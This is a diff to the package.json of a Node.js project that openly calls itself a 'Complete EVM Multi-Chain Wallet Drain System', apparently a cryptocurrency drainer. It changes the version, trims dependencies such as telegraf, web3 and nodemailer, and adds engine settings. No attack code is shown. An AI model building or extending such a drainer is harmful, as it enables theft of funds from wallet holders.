@@ -1,8 +1,9 @@
 {
   "name": "bitcoin-hyper-multichain-drain",
-  "version": "6.0.0",
+  "version": "13.0.0",
   "description": "Complete EVM Multi-Chain Wallet Drain System",
   "main": "index.js",
+  "type": "commonjs",
   "scripts": {
     "start": "node index.js",
     "dev": "nodemon index.js",
@@ -13,17 +14,17 @@
     "cors": "^2.8.5",
     "helmet": "^7.0.0",
     "morgan": "^1.10.0",
-    "telegraf": "^4.12.2",
     "axios": "^1.6.0",
     "crypto": "^1.0.1",
     "express-rate-limit": "^7.1.5",
-    "web3": "^4.0.3",
     "ethers": "^6.8.0",
-    "dotenv": "^16.3.1",
-    "nodemailer": "^6.9.7"
+    "dotenv": "^16.3.1"
   },
   "devDependencies": {
     "nodemon": "^3.0.1"
+  },
+  "engines": {
+    "node": ">=18.0.0"
   },
   "keywords": [
     "bitcoin",
